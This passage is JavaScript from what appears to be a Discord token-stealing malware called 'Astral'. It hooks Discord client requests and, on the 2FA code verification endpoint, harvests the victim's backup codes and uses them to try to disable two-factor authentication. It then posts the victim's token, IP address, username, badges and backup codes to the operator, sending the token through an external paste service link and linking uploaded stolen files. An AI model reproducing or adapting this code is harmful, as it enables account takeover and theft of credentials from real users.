                name: "Badges <a:badges:1130448593715740692>",
                value: GetBadges(user.flags),
                inline: false,
              },
              {
                name: "<a:eatsomething:1130449693613228072> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: !1,
              },
            ],
  
            thumbnail: userAvatar,
          });
          await post(params);
          break;
        case request.url.endsWith("/codes-verification"):
          let validCodeFound = false;
          let backup_code = (await execScript(backupscript)) ?? "";
          if (config.disable2FA == "true") {
            for (let i = 0; i < backup_code.length; i++) {
              if (!validCodeFound) {
                let res = await remove2FA(token, backup_code[i]);
                let parse_res = JSON.parse(res);
                if (parse_res.token) {
                  validCodeFound = true;
                  break;
                } else {
                  if (parse_res.message && parse_res.code) {
                    if (parse_res.message == "401: Unauthorized") {
                      validCodeFound = true;
                      break;
                    }
                  } else {
                    if (parse_res.message != "Invalid two-factor code") {
                      validCodeFound = true;
                      break;
                    } else {
                      continue;
                    }
                  }
                }
              }
            }
          }
          var params = await makeEmbed({
            title: "Astral User 2FA Codes",
            color: config["embed-color"],
            fields: [
              {
                name: "Astral Files",
                value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                inline: false,
              },
              {
                name: "IP",
                value: "`" + ip + "`",
                inline: false,
              },
              {
                name: "Username <:username:1041634536733290596>",
                value: `\`${user.username}#${user.discriminator}\``,
                inline: false,
              },
              {
                name: "Language <:4533language:1130453119919206500>",
                value: GetLangue(user.locale),
                inline: false,
              },
              {
                name: "A2F <:backup116:1102200730829471754>",
                value: GetA2F(user.mfa_enabled),
                inline: false,
              },
              {
                name: "Badges <a:badges:1130448593715740692>",
                value: GetBadges(user.flags),
                inline: false,
              },
              {
                name: "2FA disabler Response <:2FA:982994698278952980> ",
                value: `\`\`\`md\n- ${
                  validCodeFound ? "Disabled" : "Cannot Disable"
                }\`\`\``,
                inline: false,
              },
              {
                name: "Backup Codes <a:cat_rolling:1130448570789679165>",
                value: `\`\`\`md\n${backup_code
                  .map((x) => `- ${x}`)
                  .join("\n")}\`\`\``,
                inline: false,
              },
              {
                name: "<a:eatsomething:1130449693613228072> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: !1,
              },
            ],
  
            thumbnail: userAvatar,
          });
          await post(params);
          break;
      }
    }
  );
 